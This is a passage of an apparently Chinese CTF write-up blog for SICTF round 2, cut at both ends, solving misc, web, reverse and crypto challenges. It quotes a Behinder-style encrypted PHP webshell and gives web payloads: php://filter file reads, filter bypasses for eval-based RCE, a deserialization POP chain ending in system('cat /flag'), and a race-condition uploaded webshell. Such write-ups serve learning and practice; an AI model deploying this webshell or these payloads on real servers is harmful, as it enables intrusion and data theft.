class="variable">$key</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">                <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                             <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">key = <span class="string">&#x27;2295d22e2d70888f&#x27;</span></span><br></pre></td></tr></table></figure><p>解冰蝎流量</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194824995-1700990465940-272.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span><br></pre></td></tr></table></figure><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194834595-1700990465940-274.png"></p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194844075-1700990465940-273.png"></p><p>变异凯撒</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">decrypt_string</span>(ciphertext, offsets):</span><br><span class="line">    decrypted_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    offset_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % <span class="number">26</span></span><br><span class="line">        decrypted_char_code = (<span class="title function_ invoke__">ord</span>(char) - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        decrypted_char = <span class="title function_ invoke__">chr</span>(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + <span class="number">1</span>) % <span class="title function_ invoke__">len</span>(offsets)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span></span><br><span class="line">offsets = [<span class="number">1</span>, <span class="number">50</span>, <span class="number">61</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">20</span>, <span class="number">63</span>, <span class="number">41</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    decrypted_string = <span class="title function_ invoke__">decrypt_string</span>(ciphertext, offsets)</span><br><span class="line">    <span class="keyword">print</span>(decrypted_string)</span><br></pre></td></tr></table></figure><p>FLAG：SICTFSHUMUISAGOODBOYYYYYYYYY</p><h3 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194855104-1700990465940-275.png"></p><p>morse解密</p><p>得到falg</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194905075-1700990465940-277.png"></p><p>变成小写</p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建图片函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成图片数组</span></span><br><span class="line">    image_array = [[<span class="number">255</span> <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> bit <span class="keyword">in</span> line.strip()] <span class="keyword">for</span> line <span class="keyword">in</span> lines]</span><br><span class="line">    image_array = np.array(image_array, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存为图片</span></span><br><span class="line">    plt.imsave(<span class="string">&#x27;output.png&#x27;</span>, image_array, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二维码函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    decoded_objects = decode(image)</span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> decoded_objects:</span><br><span class="line">        <span class="keyword">return</span> obj.data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器</span></span><br><span class="line">conn = remote(<span class="string">&#x27;210.44.151.51&#x27;</span>, <span class="number">10365</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 从服务器接收数据</span></span><br><span class="line">        data = conn.recvuntil(<span class="string">&#x27;Please Decrypt this QR code:&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据保存到文本文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(data.decode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从文本文件创建图片</span></span><br><span class="line">        create_image(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取图片中的二维码</span></span><br><span class="line">        code = read_qr_code(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送二维码到服务器</span></span><br><span class="line">        conn.sendline(<span class="built_in">str</span>(code))</span><br><span class="line">        conn.recvline()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 关闭文件</span></span><br><span class="line">        file.close()</span><br></pre></td></tr></table></figure><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>第三道就是flag</p><p>SICTF{SICTF_Round3_will_do_even_better!}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h3><p>利用伪协议可直接读到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?SICTF=php://<span class="built_in">filter</span>/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h3 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/_|%5f|\.|%2E/i&#x27;, $query)) &#123;</span><br><span class="line">    die(&#x27;You are Hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#x27;k_e_y&#x27;] !==&#x27;123&#x27; &amp;&amp; preg_match(&#x27;/^123$/&#x27;,$_GET[&#x27;k_e_y&#x27;]))&#123;</span><br><span class="line">    echo(&quot;You are will Win!&lt;br&gt;&quot;);</span><br><span class="line">    if(isset($_POST[&#x27;command&#x27;]))&#123;</span><br><span class="line">        $command = $_POST[&#x27;command&#x27;];</span><br><span class="line">        if(!preg_match(&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\（|\）|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;,$command))&#123;</span><br><span class="line">            eval($command);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo(&quot;You are Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo(&quot;K_e_y is Errors!&quot;);</span><br><span class="line">&#125;K_e_y is Errors!</span><br></pre></td></tr></table></figure><p>代码开始会对输入的字符串进行正则匹配，跟_有关的url编码之类的全部过滤</p><p>可以用空格或者.代替_,.又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p><p>后面cmd一个无数字字母rce</p><p>可见ctfshow  web40的题解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?k%20e%20y=123%0a</span><br><span class="line">command=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$code = $_POST[&#x27;code&#x27;]; </span><br><span class="line">$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); </span><br><span class="line">$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); </span><br><span class="line">eval($code); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>借鉴宏爷文章</p><p><a href="https://blog.csdn.net/qq_63928796/article/details/127963079">https://blog.csdn.net/qq_63928796/article/details/127963079</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=cat /f*</span><br></pre></td></tr></table></figure><h3 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h3><p>POP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span> = <span class="string">&#x27;233333333&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/233333333/&quot;</span>,<span class="variable">$this</span>-&gt;pop))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;扣1送地狱火&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;i = <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nogame-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;必须执行&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span> = <span class="string">&#x27;QNKCDZO&#x27;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span> = <span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I also want to fall in love&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;girl != <span class="variable language_">$this</span>-&gt;boy &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;girl) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;boy))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Aec-&gt;<span class="title function_ invoke__">game</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;有对象我会在这打CTF???看我克隆一个对象！&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&quot;game&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;打游戏去，别想着对象了&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;MyLover = <span class="keyword">clone</span> <span class="keyword">new</span> B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop -&gt;Aec = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop -&gt;Aec -&gt; nogame = <span class="keyword">new</span> <span class="title function_ invoke__">P</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><p>解析时第一个[会解析为下划线</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A[B_C=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;Aec&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;233333333&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;P&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;MyLover&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;girl&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;QNKCDZO&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;boy&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;240610708&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>条件竞争</p><p>准备一个php文件</p><p>内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>抓两个包</p><p>一个为get传参的包，访问url&#x2F;uploads&#x2F;2.php,抓包</p><p>另一个为post包，直接就抓上传的包，如下</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194924480-1700990465940-276.png"></p><p>俩个包用burp爆破，爆破方式为noplayload，开跑</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194932339-1700990465940-278.png"></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h3 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 <span class="number">1.</span>pyc &gt; <span class="number">1.</span>py</span><br></pre></td></tr></table></figure><h3 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3><p>动调出数据，直接赛博厨子秒了</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194940735-1700990465940-280.png"></p><h3 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3><p>换表加密</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194948225-1700990465940-279.png"></p><p><img src="/2023/09/10/SICTF-2nd/Blog/blog/themes/fluid/source/img/image-20230910151009599.png"></p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194958542-1700990465940-282.png"></p><h3 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BASE64_CHARS = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">base64_decode</span><span class="params">(encoded_data)</span>:</span><br><span class="line">    decoded_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    padding_count = encoded_data.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    encoded_data = encoded_data.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="type">char</span> in encoded_data:</span><br><span class="line">        decimal_val = BASE64_CHARS.index(<span class="type">char</span>)</span><br><span class="line">        binary_str += format(decimal_val, <span class="string">&#x27;06b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> padding_count &gt; <span class="number">0</span>:</span><br><span class="line">        binary_str = binary_str[:-padding_count * <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(binary_str)</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="type">byte</span> = binary_str[i:i + <span class="number">8</span>]</span><br><span class="line">        decoded_data += chr(<span class="type">int</span>(<span class="type">byte</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">decoded_data</span></span><br><span class="line"></span><br><span class="line"><span class="variable">encoded_data</span> <span class="operator">=</span> input(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">decoded_data = base64_decode(encoded_data)</span><br><span class="line">print(decoded_data)</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195011641-1700990465940-281.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="古典大杂烩"><a href="#古典大杂烩" class="headerlink" title="古典大杂烩"></a>古典大杂烩</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 